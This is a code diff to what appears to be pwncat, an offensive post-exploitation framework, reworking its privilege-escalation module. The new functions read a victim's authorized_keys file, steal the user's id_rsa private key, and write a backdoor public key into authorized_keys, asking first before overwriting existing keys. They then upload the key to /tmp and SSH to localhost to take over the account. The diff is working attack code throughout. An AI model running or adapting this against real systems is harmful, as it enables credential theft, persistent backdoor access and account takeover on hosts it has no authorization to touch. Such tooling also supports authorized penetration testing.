@@ -5,6 +5,8 @@ import dataclasses
 import time
 import os
 
+import rich.prompt
+
 import pwncat
 from pwncat.modules import (
     BaseModule,
@@ -343,7 +345,8 @@ class EscalateResult(Result):
         for technique in self.techniques[user]:
             if Capability.WRITE in technique.caps:
                 try:
-                    return technique.write(filepath, data)
+                    technique.write(filepath, data)
+                    return technique
                 except EscalateError:
                     continue
 
@@ -365,7 +368,9 @@ class EscalateResult(Result):
 
         # Send the exit command to return to the previous user/undo what we
         # did to get here.
-        pwncat.victim.client.send(exit_cmd)
+        exit_cmd.unwrap()
+
+        return exit_cmd.chain[0][0]
 
     def read(self, user: str, filepath: str, progress, no_exec: bool = False):
         """ Attempt to use all the techniques enumerated to read a file
@@ -378,7 +383,7 @@ class EscalateResult(Result):
         for technique in self.techniques[user]:
             if Capability.READ in technique.caps:
                 try:
-                    return technique.read(filepath)
+                    return technique.read(filepath), technique
                 except EscalateError:
                     continue
 
@@ -396,10 +401,124 @@ class EscalateResult(Result):
             filp = pwncat.victim.open(filepath, "r",)
             # Our exit command needs to be run as well when the file is
             # closed
-            filp.exit_cmd += exit_cmd
-            return filp
+            original_close = filp.close
+
+            def new_close():
+                original_close()
+                exit_cmd.unwrap()
+
+            filp.close = new_close
+
+            return filp, exit_cmd.chain[0][0]
         except (PermissionError, FileNotFoundError):
             raise EscalateError(f"file read as {user} not possible")
+
+    def read_auth_keys(self, user: str, progress):
+        """ Attempt to read the users authorized keys file. """
+
+        for fact in pwncat.modules.run(
+            "enumerate.gather", types=["service.sshd.config"], progress=progress
+        ):
+            if "AuthorizedKeysFile" in fact.data:
+                authkeys_paths = fact.data["AuthorizedKeysFile"].split(" ")
+                for i in range(len(authkeys_paths)):
+                    path = authkeys_paths[i].replace("%%", "%")
+                    path = path.replace("%h", pwncat.victim.users[user].homedir)
+                    path = path.replace("%u", user)
+                    if not path.startswith("/"):
+                        path = os.path.join(pwncat.victim.users[user].homedir, path)
+                    authkeys_paths[i] = path
+                break
+            if "AuthorizedKeysCommand" in fact.data:
+                authkeys_paths = []
+                break
+        else:
+            authkeys_paths = [
+                os.path.join(pwncat.victim.users[user].homedir, ".ssh/authorized_keys")
+            ]
+
+        # Failed
+        if not authkeys_paths:
+            return None
+
+        try:
+            for path in authkeys_paths:
+                filp, _ = self.read(user, path, progress, no_exec=True)
+                with filp:
+                    authkeys = (
+                        filp.read()
+                        .strip()
+                        .decode("utf-8")
+                        .replace("\r\n", "\n")
+                        .split("\n")
+                    )
+                    authkeys_path = path
+        except EscalateError:
+            authkeys = None
+            authkeys_path = None if not authkeys_paths else authkeys_paths[0]
+
+        return authkeys, authkeys_path
+
+    def leak_private_key(self, user: str, progress, auth_keys: List[str]):
+        """ Attempt to leak a user's private key """
+
+        privkey_names = ["id_rsa"]
+        for privkey_name in privkey_names:
+            privkey_path = os.path.join(
+                pwncat.victim.users[user].homedir, ".ssh", privkey_name
+            )
+            pubkey_path = privkey_path + ".pub"
+
+            try:
+                filp, technique = self.read(user, privkey_path, progress, no_exec=True)
+                with filp:
+                    privkey = (
+                        filp.read().replace(b"\r\n", b"\n").decode("utf-8").rstrip("\n")
+                        + "\n"
+                    )
+            except EscalateError:
+                progress.log(f"reading failed :(")
+                continue
+
+            try:
+                filp, _ = self.read(user, pubkey_path, progress, no_exec=True)
+                with filp:
+                    pubkey = filp.read().strip().decode("utf-8")
+            except EscalateError:
+                pubkey = None
+
+            # If we have authorized keys and a public key,
+            # verify this key is valid
+            if auth_keys is not None and pubkey is not None:
+                if pubkey not in auth_keys:
+                    continue
+
+            return privkey, technique
+
+        return None, None
+
+    def write_authorized_key(
+        self, user: str, pubkey: str, authkeys: List[str], authkeys_path: str, progress
+    ):
+        """ Attempt to Write the given public key to the user's authorized
+        keys file. Return True if successful, otherwise return False.
+
+        The authorized keys file will be overwritten with the contents of the given
+        authorized keys plus the specified public key. You should read the authorized
+        keys file first in order to not clobber any existing keys.
+        """
+
+        try:
+            authkeys.append(pubkey.rstrip("\n"))
+            data = "\n".join(authkeys)
+            data = data.rstrip("\n") + "\n"
+            technique = self.write(
+                user, authkeys_path, data.encode("utf-8"), progress, no_exec=True
+            )
+        except EscalateError:
+            return None
+
+        return technique
 
     def exec(self, user: str, shell: str, progress):
         """ Attempt to use all the techniques enumerated to execute a
@@ -410,23 +529,14 @@ class EscalateResult(Result):
         target_user = pwncat.victim.users[user]
         task = progress.add_task("", module="escalating", status="...")
 
+        # Ensure all output is flushed
+        pwncat.victim.flush_output()
+
+        # Ensure we are in a safe directory
+        pwncat.victim.chdir("/tmp")
+
         if user in self.techniques:
-
-            # Catelog techniques based on capability
-            readers: List[Technique] = []
-            writers: List[Technique] = []
-
-            # Ensure all output is flushed
-            pwncat.victim.flush_output()
-
-            # Ensure we are in a safe directory
-            pwncat.victim.chdir("/tmp")
-
             for technique in self.techniques[user]:
-                if Capability.READ in technique.caps:
-                    readers.append(technique)
-                if Capability.WRITE in technique.caps:
-                    readers.append(technique)
                 if Capability.SHELL in technique.caps:
                     try:
                         progress.update(task, status=str(technique))
@@ -454,129 +564,98 @@ class EscalateResult(Result):
                     except EscalateError:
                         continue
 
-            progress.update(task, status="checking for ssh server")
+        progress.update(task, status="checking for ssh server")
 
-            sshd = None
-            for fact in pwncat.modules.run(
-                "enumerate.gather", progress=progress, types=["system.service"]
-            ):
-                if "sshd" in fact.data.name and fact.data.state == "running":
-                    sshd = fact.data
+        # Enumerate system services loooking for an sshd service
+        sshd = None
+        for fact in pwncat.modules.run(
+            "enumerate.gather", progress=progress, types=["system.service"]
+        ):
+            if "sshd" in fact.data.name and fact.data.state == "running":
+                sshd = fact.data
+                break
 
-            ssh_path = pwncat.victim.which("ssh")
-            used_tech = None
+        # Look for the `ssh` binary
+        ssh_path = pwncat.victim.which("ssh")
 
-            if sshd is not None and sshd.state == "running" and ssh_path:
-                # SSH is running and we have a local SSH binary
+        # If ssh is running, and we have a local `ssh`, then we can
+        # attempt to leak private keys via readers/writers and
+        # escalate with an ssh user@localhost
+        if sshd is not None and sshd.state == "running" and ssh_path:
 
-                progress.update(task, "checking authorized keys location")
+            # Read the user's authorized keys
+            progress.update(task, status="attempting to read authorized keys")
+            authkeys, authkeys_path = self.read_auth_keys(user, progress)
 
-                # Get the path to the authorized keys file
-                for fact in pwncat.modules.run(
-                    "enumerate.gather", progress=progress, types=["sshd.authkey_path"],
-                ):
-                    authkey_path = fact.data
-                    break
-                else:
-                    progress.log(
-                        "[yellow]warning[/yellow]: assuming authorized key path: .ssh/authorized_keys"
-                    )
-                    authkey_path = ".ssh/authorized_keys"
+            # Attempt to read private key
+            progress.update(task, status="attempting to read private keys")
+            privkey, used_tech = self.leak_private_key(user, progress, authkeys)
 
-                # Find relative authorized keys directory
-                home = pwncat.victim.users[user].homedir
-                if not authkey_path.startswith("/"):
-                    if home == "" or home is None:
-                        raise EscalateError("no user home directory")
+            # We couldn't read the private key
+            if privkey is None:
 
-                    authkey_path = os.path.join(home, authkey_path)
-
-                progress.update(task, status="reading authorized keys")
-
-                # Attempt to read the authorized keys file
-                # this may raise a EscalateError, but that's fine.
-                # If we don't have this, we can't do escalate anyway
-                with self.read(user, authkey_path, no_exec=True) as filp:
-                    authkeys = [line.strip().decode("utf-8") for line in filp]
-
-                for pubkey_path in ["id_rsa.pub"]:
-                    # Read the public key
-                    pubkey_path = os.path.join(home, ".ssh", pubkey_path)
-                    progress.update(task, status=f"attempting to read {pubkey_path}")
-                    with self.read(user, pubkey_path, no_exec=True) as filp:
-                        pubkey = filp.read().strip().decode("utf-8")
-
-                    if pubkey not in authkeys:
-                        continue
-
-                    # The public key is an authorized key
-                    privkey_path = pubkey_path.replace(".pub", "")
-                    progress.update(
-                        task,
-                        status=f"attempting to read {pubkey_path.replace('.pub', '')}",
-                    )
-                    try:
-                        with self.read(user, privkey_path, no_exec=True) as filp:
-                            privkey = (
-                                filp.read()
-                                .strip()
-                                .decode("utf-8")
-                                .replace("\r\n", "\n")
-                            )
-                    except EscalateError:
-                        # Unable to read private key
-                        continue
-
-                    # NOTE - this isn't technically true... it could have been any
-                    # of the readers...
-                    used_tech = readers[0]
-
-                    break
-                else:
-                    # We couldn't read any private keys. Try to write one instead
+                try:
+                    # Read our backdoor private key
                     with open(pwncat.victim.config["privkey"], "r") as filp:
                         privkey = filp.read()
                     with open(pwncat.victim.config["privkey"] + ".pub", "r") as filp:
-                        pubkey = filp.read().strip()
+                        pubkey = filp.read()
 
-                    # Add our public key
-                    authkeys.append(pubkey)
+                    if authkeys is None:
+                        # This is important. Ask the user if they want to
+                        # clobber the authorized keys
+                        progress.stop()
+                        if rich.prompt.Confirm(
+                            "could not read authorized keys; attempt to clobber user keys?"
+                        ):
+                            authkeys = []
+                        progress.start()
 
-                    # This may cause a EscalateError, but that's fine. We have failed
-                    # if we can't write anyway.
-                    progress.update(task, status="adding backdoor public key")
-                    self.write(
-                        user, authkey_path, ("\n".join(authkeys) + "\n").encode("utf-8")
-                    )
+                    # Attempt to write to the authorized keys file
+                    if authkeys is None:
+                        progress.update(
+                            task, status="attemping to write authorized keys"
+                        )
+                        used_tech = self.write_authorized_key(
+                            user, pubkey, authkeys, authkeys_path, progress
+                        )
+                        if used_tech is None:
+                            privkey = None
 
-                    # NOTE - this isn't technically true... it could have been any
-                    # of the writers
-                    used_tech = writers[0]
+                except (FileNotFoundError, PermissionError):
+                    privkey = None
 
-                # Private keys **NEED** a new line
-                privkey = privkey.strip() + "\n"
+            if privkey is not None:
 
-                # Write the private key
+                # Write the private key to a temporary file for local usage
                 progress.update(task, status="uploading private key")
                 with pwncat.victim.tempfile("w", length=len(privkey)) as filp:
                     filp.write(privkey)
                     privkey_path = filp.name
 
                 # Ensure we track this new file
-                pwncat.victim.tamper.created_file(privkey_path)
+                tamper = pwncat.victim.tamper.created_file(privkey_path)
+                # SSH needs strict permissions
+                progress.update(task, status="fixing private key permissions")
                 pwncat.victim.run(f"chmod 600 {privkey_path}")
 
                 # First, run a test to make sure we authenticate
+                progress.update(task, status="testing local escalation")
                 command = (
                     f"{ssh_path} -i {privkey_path} -o StrictHostKeyChecking=no -o PasswordAuthentication=no "
                     f"{user}@127.0.0.1"
                 )
                 output = pwncat.victim.run(f"{command} echo good")
 
+                # We failed. Remove the private key and raise an
+                # exception
                 if b"good" not in output:
+                    tamper.revert()
+                    pwncat.victim.tamper.remove(tamper)
                     raise EscalateError("ssh private key failed")
 
                 # The test worked! Run the real escalate command
+                progress.update(task, status="escalating via ssh!")
                 pwncat.victim.process(command)
 
                 pwncat.victim.reset(hard=False)
